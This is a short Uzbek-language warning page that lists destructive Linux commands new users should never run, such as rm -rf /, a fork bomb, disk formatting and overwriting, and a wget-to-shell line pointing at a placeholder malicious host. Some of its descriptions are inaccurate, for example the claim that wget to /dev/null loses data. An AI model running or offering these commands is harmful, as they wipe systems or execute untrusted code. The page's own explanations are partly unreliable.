---

tags: zararli-buyruqlar

description: Ayrim zararli buyruqlar

title: Zararli Buyruqlar

---
💻 **Ushbu Linux buyruqlarini hech qachon ishga tushirmang!!**

> Men Linuxni moslashuvchanligi va cheksiz imkoniyatlari uchun yaxshi ko'raman)

🗄`rm -rf /`  – Bu buyruq kompyuteringizdagi barcha fayl va papkalarni **oʻchirib** tashlaydi. 

🗄`:(){ :|: & };:` – Bu buyruq “vilkalar bombasi” sifatida ham tanilgan, kompyuteringiz xotirasi tugashiga va tizimning ishdan chiqishiga olib keladi.

🗄`mkfs.ext4 /dev/sda` - Bu buyruq qattiq diskni hech qanday ogohlantirishsiz formatlaydi. Barcha ma'lumotlar yo'qoladi.

🗄`dd if=/dev/random of=/dev/sda` - Bu buyruq qattiq diskdagi barcha ma'lumotlarni tasodifiy qiymatlar bilan to'ldiradi, natijada ma'lumotlar yo'qoladi.

🗄`chmod 777 /` – Bu buyruq barcha foydalanuvchilar uchun fayl tizimingizga toʻliq kirish imkonini beradi, bu esa xavfsizlik buzilishiga olib kelishi mumkin.

🗄`mv /home/* /dev/null` – Bu buyruq uy katalogingizdagi barcha fayllarni “null” ga o'tkazadi, qisqasi, ular yo'qoladi.

🗄`wget http://example.com/file -O /dev/null` - Bu buyruq faylni yuklab oladi va barcha ma'lumotlarni "null" ga qayta yozadi, natijada ma'lumotlar yo'qoladi.

🗄`mkfs.ext4 /dev/sda1` - Bu buyruq qattiq disk partition-ni hech qanday ogohlantirish yoki tasdiqlamasdan formatlaydi. Ushbu partition-dagi barcha ma'lumotlar yo'qoladi.

🗄ln -s /dev/null /etc/passwd – Bu buyruq “null”da “/etc/passwd” ga ramziy havola yaratadi, natijada ma’lumotlar yo‘qoladi.

🗄`echo "Salom" > /dev/sda` - Bu tizimni yuklash uchun zarur bo'lgan barcha ma'lumotlarni o'z ichiga olgan partition-ni "Salom" satriga almashtiradi.

🗄`wget http://malicious_source -O- | sh` - Bunday buyruqlar tizimingiz xavfsizligini buzishi mumkin bo'lgan zararli skriptlarni yuklab oladi va ishga tushiradi.

Bularni ulashishdan maqsad internetdagi forumlarda yangi Linux foydalanuvchi sifatida oddiy savollar berish uchun qo'shilsangiz, forumdagi odamlar sizni mazah qilib yuqoridagi buyruqlardan birini savolingizga javob tariqasida qaytaradi. Maslahatim, shubxali buyruqlarni ChatGPT-dan so'rang.



